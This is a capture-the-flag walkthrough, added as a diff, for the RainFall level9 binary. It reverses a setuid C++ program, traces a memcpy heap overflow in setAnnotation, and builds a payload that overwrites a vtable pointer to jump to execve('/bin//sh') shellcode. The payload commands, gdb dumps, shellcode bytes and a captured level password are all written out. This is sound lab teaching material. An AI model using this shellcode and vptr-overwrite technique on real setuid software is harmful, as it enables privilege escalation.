@@ -1,0 +1,241 @@
+
+```bash
+level9@RainFall:~$ ls -la
+-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
+
+level9@RainFall:~$ file level9 
+level9: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xdda359aa790074668598f47d1ee04164f5b63afa, not stripped
+```
+
+Reversed in c:
+```cpp
+class N
+{
+    private:
+        // ... 0x4
+        char _annotation[22];
+        // ... 0x26
+        int _value;
+        
+        // ... 0x68
+        int _other_value;
+
+    public:
+        N(int a2)
+        {
+            this->_value = a2;
+        }
+
+        void *setAnnotation(char *s)
+        {
+            size_t s_len;
+
+            s_len = strlen(s);
+            return memcpy(annotation, s, s_len);
+        }
+
+        int operator+(N &other)
+        {
+            return this->_other_value + other->_other_value;
+        }
+        int operator-(N &other)
+        {
+            return this->_other_value - other->_other_value;
+        }
+};
+
+int main(int argc, const char **argv, const char **envp)
+{
+    N *v3;
+    N *v4;
+
+    if (argc <= 1)
+    {
+        exit(1);
+    }
+
+    v3 = new N(5);
+    v4 = new N(6);
+    v3->setAnnotation(argv[1]);
+
+    return (**(int (__cdecl ***)(N *, N *))v4)(v4, v3);
+}
+```
+
+This is a exemple using of a C++ vtable
+We can spot the vunerability at `setAnnotation(char*)`, which can overflow with `memcpy()`
+
+First we need to be sure how the memory is layout:
+```bash
+(gdb) x/64wx 0x804a000
+0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
+0x804a010:	0x42424242	0x43434343	0x44444444	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000
+0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000
+0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+
+The first `new()` call alloced at the address `0x804a008` and the other one at `0x804a078`
+We can also see the `memcpy()` starting to write at address `0x804a00c` the string `AAAABBBBCCCC`
+
+With that we can take a look a the vtable (`0x08048848`):
+```bash
+(gdb) x/8x 0x08048848
+0x8048848 <_ZTV1N+8>:   0x0804873a      0x0804874e      0x00004e31      0x08049b88
+0x8048858 <_ZTI1N+4>:   0x08048850      0x3b031b01      0x00000060      0x0000000b
+(gdb) info symbol 0x0804873a
+N::operator+(N&) in section .text of /home/user/level9/level9
+(gdb) info symbol 0x0804874e
+N::operator-(N&) in section .text of /home/user/level9/level9
+(gdb) info symbol 0x08049b88
+_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3 + 8 in section .bss of /home/user/level9/level9
+```
+
+We can gather more info with `objdump`:
+```bash
+level9@RainFall:~$ objdump -C -d ./level9 --start-address=0x08048720 --stop-address=0x08048780
+./level9:     file format elf32-i386
+Disassembly of section .text:
+08048720 <N::setAnnotation(char*)+0x12>:
+ 8048720:	55                   	push   %ebp
+ 8048721:	08 83 c2 04 89 44    	or     %al,0x448904c2(%ebx)
+ 8048727:	24 08                	and    $0x8,%al
+ 8048729:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 804872c:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 8048730:	89 14 24             	mov    %edx,(%esp)
+ 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt>
+ 8048738:	c9                   	leave  
+ 8048739:	c3                   	ret    
+
+0804873a <N::operator+(N&)>:
+ 804873a:	55                   	push   %ebp
+ 804873b:	89 e5                	mov    %esp,%ebp
+ 804873d:	8b 45 08             	mov    0x8(%ebp),%eax
+ 8048740:	8b 50 68             	mov    0x68(%eax),%edx
+ 8048743:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 8048746:	8b 40 68             	mov    0x68(%eax),%eax
+ 8048749:	01 d0                	add    %edx,%eax
+ 804874b:	5d                   	pop    %ebp
+ 804874c:	c3                   	ret    
+
+0804874e <N::operator-(N&)>:
+ 804874e:	55                   	push   %ebp
+ 804874f:	89 e5                	mov    %esp,%ebp
+ 8048751:	8b 45 08             	mov    0x8(%ebp),%eax
+ 8048754:	8b 50 68             	mov    0x68(%eax),%edx
+ 8048757:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 804875a:	8b 40 68             	mov    0x68(%eax),%eax
+ 804875d:	89 d1                	mov    %edx,%ecx
+ 804875f:	29 c1                	sub    %eax,%ecx
+ 8048761:	89 c8                	mov    %ecx,%eax
+ 8048763:	5d                   	pop    %ebp
+ 8048764:	c3                   	ret    
+```
+
+We analyse what `return (**(int (__cdecl ***)(N *, N *))v4)(v4, v3);` does:
+
+First it cast `v4` to a function pointer returning `int` and with args `(N*, N*)`
+So `v4` is treated as if it points at a pointer to function
+After we have the `**`, `v4` is normaly a ptr to a vptr
+Dereferancing the ptr to have vptr value and again to get the vtable value
+This is basicly reading the first entry in the vtable
+And finaly `(...)(v4, v3)` call the function pointer passing `v4` as `this *` and `v3` as `N *` arguments
+So it is a manual call through the vtable first virtual slot
+Normaly this will call `v4->operator+(v3)`
+
+So we can re-write the vptr value in `v4` with the `memcpy()`:
+```bash
+level9@RainFall:~$ ./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+```
+
+We gonna make this pointer to function call a payload in the heap:
+```bash
+rm -f /tmp/payload_9
+echo -ne "\x10\xa0\x04\x08" > /tmp/payload_9 # the fake vtable pointer 0x804a010
+printf 'A%.0s' {1..104} >> /tmp/payload_9 # 0x804a078 (134520952) -  0x804a00c (134520844) - 4 = 104
+echo -ne "\x0c\xa0\x04\x08" >> /tmp/payload_9 # change the value of the vptr in v4 to 0x804a00c
+```
+
+We check if the heap look like what we want to:
+```bash
+level9@RainFall:~$ gdb --args ./level9 "$(cat /tmp/payload_9)"
+(gdb) b *0x804867c
+Breakpoint 1 at 0x804867c
+(gdb) run
+Breakpoint 1, 0x0804867c in main ()
+(gdb) x/56x 0x804a008
+0x804a008:	0x08048848	0x0804a010	0x41414141	0x41414141
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a078:	0x0804a00c	0x00000000	0x00000000	0x00000000
+0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
+```
+
+Now we need to write the shellcode to open `execve()`:
+```asm
+0:  31 c0                   xor    eax,eax      ; eax = 0
+2:  31 d2                   xor    edx,edx      ; edx == 0 (envp = NULL)
+4:  50                      push   eax          ; push 0 (NULL)  -- terminator for argv/envp
+5:  68 2f 2f 73 68          push   0x68732f2f   ; push "//sh"
+a:  68 2f 62 69 6e          push   0x6e69622f   ; push "/bin"
+f:  89 e3                   mov    ebx,esp      ; ebx -> "/bin//sh" (filename)
+11: 50                      push   eax          ; push NULL (argv terminator)
+12: 53                      push   ebx          ; push pointer to filename
+13: 89 e1                   mov    ecx,esp      ; ecx -> argv (pointer to array [filename, NULL])
+15: b0 0b                   mov    al,0xb       ; syscall number 11 = execve
+17: cd 80                   int    0x80         ; invoke kernel
+```   
+
+We can use so website (https://defuse.ca/online-x86-assembler.htm#disassembly) or compiler to get the shell code in a full string:
+"\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
+
+And we inject the shell code in the heap:
+```bash
+rm -f /tmp/payload_9
+echo -ne "\x10\xa0\x04\x08" > /tmp/payload_9 # the fake vtable pointer 0x804a010
+echo -ne "\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" >> /tmp/payload_9 #shell code
+printf 'A%.0s' {1..79} >> /tmp/payload_9 # 0x804a078 (134520952) -  0x804a00c (134520844) - 4 - 25 (sheelcode) = 79 (104)
+echo -ne "\x0c\xa0\x04\x08" >> /tmp/payload_9 # change the value of the vptr in v4 to 0x804a00c
+```
+
+And we run it with the payload:
+```bash
+level9@RainFall:~$ ./level9 "$(cat /tmp/payload_9)"
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
+
+## using script
+```bash
+python ressources/exploit.py
+    b'\x10\xa0\x04\x081\xc01\xd2Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0c\xa0\x04\x08'
+```
+
+copy past the output (without b) :
+```bash
+level9@RainFall:~$ echo -ne '\x10\xa0\x04\x081\xc01\xd2Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0c\xa0\x04\x08' > /tmp/byscript
+level9@RainFall:~$ ./level9 "$(cat /tmp/byscript)"
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
